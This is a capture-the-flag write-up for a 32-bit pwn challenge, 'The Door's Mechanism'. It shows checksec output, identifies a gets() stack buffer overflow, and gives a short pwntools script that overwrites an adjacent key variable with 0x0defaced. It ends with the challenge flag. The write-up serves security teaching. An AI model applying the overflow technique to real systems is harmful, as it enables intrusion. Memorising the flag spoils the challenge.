---
layout: writeup

title: The Door's Mechanism
difficulty: Medium
points: 500
categories: [pwn]
tags: []

flag: Dynamic Flag
---

# The Door's Mechanism

## Challenge Information
- **Title**: The Door's Mechanism
- **Category**: pwn
- **Difficulty**: Easy
- **Points**: [Point Value]

## Challenge Description
We are given a 32-bit ELF binary named `vuln`. The goal is to provide the correct input to get the flag.

## Solution

### Initial Analysis
First run `file` and `checksec` on the binary to see what we are dealing with.

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, ... not stripped

$ checksec vuln
[*] 'vuln'
    Arch:     i386-32-bit-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```
The binary is a 32-bit executable with no security protections. This strongly suggests a classic stack-based exploit.

Running the binary, it asks for input:

```bash
$ ./vuln
Enter the code: test
Access denied.
```
Analyzing the decompiled code in `ghidra`, we can spot the vulnerability in the input() function.

The gets(buffer) call reads input into a 32-byte buffer without any size limit, creating a stack buffer overflow.

The solution is to use the buffer overflow from gets(buffer) to overwrite the adjacent key variable on the stack with the value `0x0defaced`.

### Tools Used
- pwntools
- Ghidra
- checksec

### Step-by-Step Solution

#### Step 1: Determine Stack Layout and Offset

`gets()` writes up the stack (towards higher addresses), when we overflow the 32-byte buffer, the very next 4 bytes we send will overwrite the memory allocated for the `key` variable.

Therefore, our offset is 32 bytes.

#### Step 2: Craft the Payload

We need to send:
- 32 bytes of "junk" padding to fill the buffer.
- The 4-byte value `0x0defaced` to overwrite key.

Our final payload will be: `[32 bytes of 'A'] + [0x0defaced]`

#### Step 3: Write the Exploit

```python
from pwn import *

key_value = p32(0x0defaced)
padding = b'A' * 32

payload = padding + key_value

#p = process('./vuln')
p = remote("target_host",PORT)

print(f"Sending payload: {payload}")
p.sendline(payload)
print(p.recvall().decode())
```
Running this `pwntools` python script give you the flag.

### Flag
```CYS{pwn!@#$\_overflow\_#}```
